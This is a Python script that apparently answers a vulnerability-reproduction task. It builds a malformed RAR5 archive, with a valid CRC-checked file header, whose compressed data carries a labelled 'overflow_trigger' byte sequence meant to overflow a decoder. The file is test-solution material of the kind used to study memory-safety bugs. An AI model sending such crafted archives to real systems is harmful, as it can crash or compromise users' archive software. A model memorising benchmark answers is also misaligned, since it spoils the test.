import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        CRC32_TABLE = [0] * 256
        for i in range(256):
            c = i
            for _ in range(8):
                if c & 1:
                    c = 0xEDB88320 ^ (c >> 1)
                else:
                    c = c >> 1
            CRC32_TABLE[i] = c

        def rar_crc32(data: bytes) -> int:
            crc = 0xFFFFFFFF
            for byte in data:
                crc = CRC32_TABLE[(crc ^ byte) & 0xFF] ^ (crc >> 8)
            return (crc ^ 0xFFFFFFFF) & 0xFFFFFFFF

        def vint(n: int) -> bytes:
            if n == 0:
                return b'\x00'
            res = bytearray()
            while n > 0:
                res.append(n & 0x7f)
                n >>= 7
            
            if len(res) > 1:
                for i in range(len(res) - 1):
                    res[i] |= 0x80
            return bytes(res)

        signature = b"\x52\x61\x72\x21\x1a\x07\x01\x00"

        block_header = b'\x80'
        overflow_trigger = b'\x11' * 9 + b'\xf1'

        pack_size = 501
        payload_len = 1 + len(overflow_trigger)
        padding = b'\x00' * (pack_size - payload_len)
        
        payload = block_header + overflow_trigger + padding

        header_type = b'\x02'
        header_flags = b'\x03'
        
        pack_size_vint = vint(pack_size)
        unpack_size_vint = vint(0)
        
        file_flags = b'\x00'
        compression_info = b'\x03'
        host_os = b'\x02'
        
        file_name = b'a'
        file_name_len_vint = vint(len(file_name))
        
        header_core_payload = (
            header_type + header_flags + pack_size_vint + unpack_size_vint +
            file_flags + compression_info + host_os + file_name_len_vint + file_name
        )
        
        header_size = 1 + len(header_core_payload)
        header_size_vint = vint(header_size)
        if len(header_size_vint) > 1:
             header_size = len(header_size_vint) + len(header_core_payload)
             header_size_vint = vint(header_size)

        file_header_payload = header_size_vint + header_core_payload
        
        crc = rar_crc32(file_header_payload)
        crc_bytes = struct.pack('<I', crc)
        
        file_header = crc_bytes + file_header_payload
        
        poc = signature + file_header + payload
        
        return poc